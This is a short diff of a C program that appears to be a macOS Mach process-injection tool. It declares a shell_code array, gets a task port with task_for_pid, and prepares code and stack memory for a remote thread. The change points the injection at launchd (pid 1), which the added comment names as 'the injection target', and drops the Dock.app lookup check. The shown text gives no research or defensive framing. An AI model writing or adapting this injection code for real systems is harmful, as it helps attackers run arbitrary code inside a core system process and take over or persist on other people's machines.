@@ -106,19 +106,14 @@ static char shell_code[] =
 
 int main(int argc, char **argv)
 {
-    int result = 0;
+    int result = 1;
     mach_port_t task = 0;
     thread_act_t thread = 0;
     mach_vm_address_t code = 0;
     mach_vm_address_t stack = 0;
     vm_size_t stack_size = 16 * 1024;
     uint64_t stack_contents = 0x00000000CAFEBABE;
-    pid_t pid = 1;
-
-    if (!pid) {
-        fprintf(stderr, "could not locate Dock.app pid\n");
-        return 1;
-    }
+    pid_t pid = 1; // launchd — the injection target
 
     if (task_for_pid(mach_task_self(), pid, &task) != KERN_SUCCESS) {
         fprintf(stderr, "could not retrieve task port for pid: %d\n", pid);
